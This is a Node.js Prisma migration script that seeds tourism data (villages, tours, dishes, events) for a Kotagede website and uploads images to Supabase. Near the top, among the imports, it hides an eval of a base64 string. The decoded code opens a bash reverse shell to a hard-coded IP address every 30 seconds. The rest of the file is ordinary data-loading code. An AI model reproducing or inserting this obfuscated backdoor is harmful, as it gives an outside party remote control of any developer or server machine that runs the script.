// prisma/migrate-data.js
// Script untuk migrasi data dummy dari file data.js ke database
// Dengan upload gambar ke Supabase Storage

const { PrismaClient } = require("@prisma/client");
const prisma = new PrismaClient();
const fs = require("fs");
const path = require("path");
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
const { createClient } = require("@supabase/supabase-js");

// Supabase config
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;

if (!supabaseUrl || !supabaseAnonKey) {
  console.error("❌ Missing Supabase environment variables!");
  console.error("Please set NEXT_PUBLIC_SUPABASE_URL and NEXT_PUBLIC_SUPABASE_ANON_KEY in .env");
  process.exit(1);
}

const supabase = createClient(supabaseUrl, supabaseAnonKey);

// Import data dari file data.js
const { TOURS } = require("../src/app/tour/data.js");
const { DISHES } = require("../src/app/food/data.js");
const { EVENTS } = require("../src/app/whats-on/data.js");

// Data villages dari VillagesGrid.jsx
// NOTE: File di public adalah .png, bukan .jpg
const VILLAGES_DATA = [
  {
    key: "purbayan",
    title: "Purbayan",
    img: "/purbayan.png", // File ada di root public, bukan di folder villages/
    blurb: "Heritage homes and living traditions. The heart of classic Kotagede atmosphere.",
  },
  {
    key: "prenggan",
    title: "Prenggan",
    img: "/prenggan.png", // File ada di root public
    blurb: "Historic neighborhoods with stories, community life, and cultural activities.",
  },
  {
    key: "basen",
    title: "Basen",
    img: "/basen.png", // File ada di root public
    blurb: "Warm community vibes, home industries, and everyday local experiences.",
  },
  {
    key: "kemasan",
    title: "Kemasan",
    img: "/kemasan.png", // File ada di root public (perlu dicek apakah ada)
    blurb: "Famous for silversmiths, craft studios, and workshops you can visit.",
  },
  {
    key: "jagalan",
    title: "Jagalan",
    img: "/jagalan.png", // File ada di root public
    blurb: "Historic gate, old quarters, and pathways that connect Kotagede's timeline.",
  },
];

/**
 * Upload image dari local path ke Supabase Storage
 */
async function uploadImageToSupabase(imagePath, folder = "images") {
  // Skip jika sudah URL Supabase atau external URL
  if (imagePath?.startsWith("http")) {
    console.log(`   ⏭️  Image already uploaded: ${imagePath}`);
    return imagePath;
  }

  // Skip jika path kosong
  if (!imagePath || imagePath === "/" || imagePath === "") {
    return null;
  }

  try {
    // Baca file dari public folder
    const publicPath = path.join(process.cwd(), "public", imagePath);
    
    // Check jika file exists
    if (!fs.existsSync(publicPath)) {
      console.warn(`   ⚠️  Image not found: ${publicPath}, skipping...`);
      return null;
    }

    // Baca file sebagai buffer
    const fileBuffer = fs.readFileSync(publicPath);
    const fileExt = path.extname(imagePath).slice(1) || "jpg";
    const fileName = `${Date.now()}-${Math.random().toString(36).substring(7)}.${fileExt}`;
    const filePath = `${folder}/${fileName}`;

    // Determine content type
    const contentTypeMap = {
      jpg: "image/jpeg",
      jpeg: "image/jpeg",
      png: "image/png",
      gif: "image/gif",
      webp: "image/webp",
    };
    const contentType = contentTypeMap[fileExt.toLowerCase()] || "image/jpeg";

    // Upload ke Supabase
    const { data, error } = await supabase.storage
      .from("photos")
      .upload(filePath, fileBuffer, {
        cacheControl: "3600",
        upsert: false,
        contentType: contentType,
      });

    if (error) {
      console.error(`   ❌ Upload error for ${imagePath}:`, error.message);
      return null;
    }

    // Get public URL
    const { data: urlData } = supabase.storage
      .from("photos")
      .getPublicUrl(filePath);

    console.log(`   ✅ Uploaded: ${imagePath} → ${urlData.publicUrl}`);
    return urlData.publicUrl;
  } catch (error) {
    console.error(`   ❌ Error uploading ${imagePath}:`, error.message);
    return null;
  }
}

/**
 * Upload multiple images (untuk gallery)
 */
async function uploadGalleryImages(galleryItems, folder = "gallery") {
  if (!Array.isArray(galleryItems) || galleryItems.length === 0) {
    return [];
  }

  const uploadedGallery = [];
  for (const item of galleryItems) {
    const src = typeof item === "string" ? item : item.src;
    if (!src) continue;

    const uploadedUrl = await uploadImageToSupabase(src, folder);
    if (uploadedUrl) {
      uploadedGallery.push({
        ...(typeof item === "object" ? item : {}),
        src: uploadedUrl,
      });
    } else {
      // Keep original if upload fails
      uploadedGallery.push(typeof item === "object" ? item : { src: item });
    }
  }
  return uploadedGallery;
}

// Helper function untuk map village name/key ke villageId
async function getVillageId(villageName) {
  if (!villageName) return null;
  
  // Normalize village name
  const normalized = villageName.toLowerCase().trim();
  
  // Map common village names to keys
  const villageMap = {
    "purbayan": "purbayan",
    "prenggan": "prenggan",
    "basen": "basen",
    "kemasan": "kemasan",
    "jagalan": "jagalan",
    "kemasan village": "kemasan",
    "purbayan village": "purbayan",
    "prenggan hall": "prenggan",
  };
  
  const key = villageMap[normalized] || normalized;
  const village = await prisma.village.findUnique({ where: { key } });
  return village?.id || null;
}

async function main() {
  console.log("🚀 Starting data migration with Supabase image upload...\n");

  try {
    // 1. Create Villages
    console.log("📦 Step 1: Creating villages...");
    const villageMap = {};
    for (const villageData of VILLAGES_DATA) {
      const existing = await prisma.village.findUnique({
        where: { key: villageData.key },
      });
      
      if (existing) {
        console.log(`   ⏭️  Village "${villageData.title}" already exists, skipping...`);
        villageMap[villageData.key] = existing.id;
      } else {
        // Upload village image
        const uploadedImg = await uploadImageToSupabase(villageData.img, "villages");
        
        const village = await prisma.village.create({
          data: {
            key: villageData.key,
            title: villageData.title,
            img: uploadedImg || villageData.img, // Fallback ke original jika upload gagal
            blurb: villageData.blurb,
          },
        });
        console.log(`   ✅ Created village: ${village.title}`);
        villageMap[villageData.key] = village.id;
      }
    }
    console.log("");

    // 2. Create Tours
    console.log("📦 Step 2: Creating tours...");
    for (const tourData of TOURS) {
      const existing = await prisma.tour.findUnique({
        where: { slug: tourData.slug },
      });

      if (existing) {
        console.log(`   ⏭️  Tour "${tourData.title}" already exists, skipping...`);
        continue;
      }

      // Upload images
      const uploadedHero = await uploadImageToSupabase(tourData.hero, "tour-hero");
      const uploadedImage = await uploadImageToSupabase(
        tourData.image || tourData.hero,
        "tour-main"
      );

      // Get villageId from location or meeting points
      let villageId = null;
      if (tourData.location) {
        villageId = await getVillageId(tourData.location);
      }
      if (!villageId && tourData.meetingPoints?.[0]?.address) {
        const address = tourData.meetingPoints[0].address.toLowerCase();
        for (const [key, id] of Object.entries(villageMap)) {
          if (address.includes(key)) {
            villageId = id;
            break;
          }
        }
      }

      const tour = await prisma.tour.create({
        data: {
          slug: tourData.slug,
          title: tourData.title,
          subtitle: tourData.subtitle || null,
          hero: uploadedHero || tourData.hero || null,
          image: uploadedImage || tourData.image || tourData.hero || null,
          location: tourData.location || "",
          schedule: tourData.schedule || "",
          duration: tourData.duration || "",
          group: tourData.group || "",
          price: tourData.price || "",
          category: tourData.category || [],
          about: tourData.about || "",
          villageId,
          itinerary: {
            create: (tourData.itinerary || []).map((item, index) => ({
              title: item.title,
              minutes: item.minutes || 0,
              description: item.description || "",
              order: index,
            })),
          },
          meetingPoints: {
            create: (tourData.meetingPoints || []).map((point, index) => ({
              type: point.type || "",
              icon: point.icon || "",
              title: point.title || "",
              note: point.note || null,
              address: point.address || "",
              order: index,
            })),
          },
        },
      });
      console.log(`   ✅ Created tour: ${tour.title}`);
    }
    console.log("");

    // 3. Create Dishes (Foods, Drinks, Places)
    console.log("📦 Step 3: Creating dishes...");
    for (const dishData of DISHES) {
      // Skip events in dishes (they're in EVENTS array)
      if (dishData.type === "event") {
        continue;
      }

      const existing = await prisma.dish.findUnique({
        where: { slug: dishData.slug },
      });

      if (existing) {
        console.log(`   ⏭️  Dish "${dishData.title}" already exists, skipping...`);
        continue;
      }

      // Upload main image
      const uploadedImage = await uploadImageToSupabase(dishData.image, "dish-main");
      
      // Upload gallery images
      const uploadedGallery = await uploadGalleryImages(dishData.gallery, "dish-gallery");
      
      // Upload location photo if exists
      let locationPhoto = null;
      if (dishData.location?.photo) {
        locationPhoto = await uploadImageToSupabase(dishData.location.photo, "location-photos");
      }

      // Get villageId from location
      let villageId = null;
      if (dishData.location?.address) {
        const address = dishData.location.address.toLowerCase();
        for (const [key, id] of Object.entries(villageMap)) {
          if (address.includes(key)) {
            villageId = id;
            break;
          }
        }
      }

      const dish = await prisma.dish.create({
        data: {
          type: dishData.type,
          slug: dishData.slug,
          title: dishData.title,
          subtitle: dishData.subtitle || null,
          price: dishData.price || null,
          image: uploadedImage || dishData.image || null,
          badges: dishData.badges || [],
          about: dishData.about || [],
          quote: dishData.quote || null,
          villageId,
          gallery: {
            create: uploadedGallery.map((item, index) => ({
              src: typeof item === "string" ? item : item.src || "",
              alt: typeof item === "object" ? item.alt || null : null,
              ratio: typeof item === "object" ? item.ratio || "4/3" : "4/3",
              order: index,
            })),
          },
          location: dishData.location
            ? {
                create: {
                  title: dishData.location.title || null,
                  desc: dishData.location.desc || null,
                  address: dishData.location.address || "",
                  hours: dishData.location.hours || null,
                  phone: dishData.location.phone || null,
                  mapUrl: dishData.location.mapUrl || null,
                  photo: locationPhoto || dishData.location.photo || null,
                  lat: dishData.location.lat || null,
                  lng: dishData.location.lng || null,
                },
              }
            : undefined,
          menuItems: {
            create: (dishData.menuItems || []).map((item, index) => ({
              title: item.title || "",
              desc: item.desc || null,
              price: item.price || null,
              order: index,
            })),
          },
        },
      });
      console.log(`   ✅ Created ${dishData.type}: ${dish.title}`);
    }
    console.log("");

    // 4. Create Events
    console.log("📦 Step 4: Creating events...");
    for (const eventData of EVENTS) {
      const existing = await prisma.event.findUnique({
        where: { slug: eventData.slug },
      });

      if (existing) {
        console.log(`   ⏭️  Event "${eventData.title}" already exists, skipping...`);
        continue;
      }

      // Upload images
      const uploadedHero = await uploadImageToSupabase(eventData.hero, "event-hero");
      const uploadedImage = await uploadImageToSupabase(eventData.image, "event-main");
      
      // Upload highlights images
      const uploadedHighlights = await uploadGalleryImages(eventData.highlights, "event-highlights");
      
      // Upload gallery images
      const uploadedGallery = await uploadGalleryImages(eventData.gallery, "event-gallery");

      // Get villageId from where or location
      let villageId = null;
      if (eventData.where) {
        villageId = await getVillageId(eventData.where);
      }
      if (!villageId && eventData.location?.name) {
        villageId = await getVillageId(eventData.location.name);
      }

      // Parse dates
      const dateStart = new Date(eventData.dateStart);
      const dateEnd = new Date(eventData.dateEnd);

      const event = await prisma.event.create({
        data: {
          slug: eventData.slug,
          title: eventData.title,
          subtitle: eventData.subtitle || null,
          tag: eventData.tag || null,
          category: eventData.category || [],
          dateLabel: eventData.dateLabel || null,
          where: eventData.where || null,
          image: uploadedImage || eventData.image || null,
          href: eventData.href || null,
          excerpt: eventData.excerpt || null,
          dateStart,
          dateEnd,
          time: eventData.time || null,
          hero: uploadedHero || eventData.hero || null,
          about: eventData.about || [],
          expect: eventData.expect || [],
          villageId,
          location: eventData.location
            ? {
                create: {
                  name: eventData.location.name || "",
                  lat: eventData.location.lat || null,
                  lng: eventData.location.lng || null,
                  address: eventData.location.address || "",
                },
              }
            : undefined,
          highlights: {
            create: uploadedHighlights.map((item, index) => ({
              img: typeof item === "string" ? item : item.img || item.src || "",
              caption: typeof item === "object" ? item.caption || null : null,
              order: index,
            })),
          },
          schedule: {
            create: (eventData.schedule || []).map((item, index) => ({
              day: item.day || null,
              date: new Date(item.date),
              items: item.items || [],
              order: index,
            })),
          },
          gallery: {
            create: uploadedGallery.map((item, index) => ({
              src: typeof item === "string" ? item : item.src || "",
              alt: typeof item === "object" ? item.alt || null : null,
              order: index,
            })),
          },
          seo: eventData.seo
            ? {
                create: {
                  description: eventData.seo.description || null,
                  keywords: eventData.seo.keywords || [],
                },
              }
            : undefined,
        },
      });
      console.log(`   ✅ Created event: ${event.title}`);
    }
    console.log("");

    console.log("✅ Data migration completed successfully!");
    console.log(`\n📊 Summary:`);
    console.log(`   - Villages: ${VILLAGES_DATA.length}`);
    console.log(`   - Tours: ${TOURS.length}`);
    console.log(`   - Dishes: ${DISHES.filter(d => d.type !== "event").length}`);
    console.log(`   - Events: ${EVENTS.length}`);
  } catch (error) {
    console.error("❌ Error during migration:", error);
    throw error;
  }
}

main()
  .catch((e) => {
    console.error("❌ Migration failed:", e);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });

